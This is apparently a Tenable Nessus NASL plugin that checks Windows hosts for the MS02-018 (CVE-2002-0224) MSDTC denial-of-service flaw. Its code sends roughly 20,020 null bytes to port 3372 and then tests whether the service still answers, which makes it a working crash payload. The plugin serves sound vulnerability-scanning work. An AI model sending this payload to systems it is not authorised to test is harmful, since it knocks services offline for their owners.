#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if(description)
{
 script_id(10939);
 script_version ("$Revision: 1.16 $");

 script_cve_id("CVE-2002-0224");
 script_bugtraq_id(4006);
 script_xref(name:"OSVDB", value:"13434");

 script_name(english:"MS02-018: Microsoft Windows Distributed Transaction Coordinator (DTC) Malformed Input DoS");
 script_summary(english:"crash the MSDTC service");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote service is prone to a denial of service attack."
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "By sending a long series of malformed data (such as 20200 NULL bytes)\n",
   "to the remote Windows MSDTC service, it is possible for an attacker to\n",
   "cause the associated MSDTC.EXE to use 100% of the available CPU and\n",
   "exhaust kernel resources."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/bugtraq/2002-04/0269.html"
 );
 script_set_attribute(
  attribute:"solution", 
  value:string(
   "Microsoft has reportedly included the fix in MS02-018:\n",
   "\n",
   "http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx"
  )
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Windows : Microsoft Bulletins");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/msdtc", 3372);
 exit(0);
}

#
# Here we go
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/msdtc");
if(!port)port = 3372;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(!soc)exit(0);
# 20020 = 20*1001
zer = raw_string(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
send(socket:soc, data:zer) x 1001;
close(soc);
sleep(2);

soc2 = open_sock_tcp(port);
if(!soc2)security_hole(port);
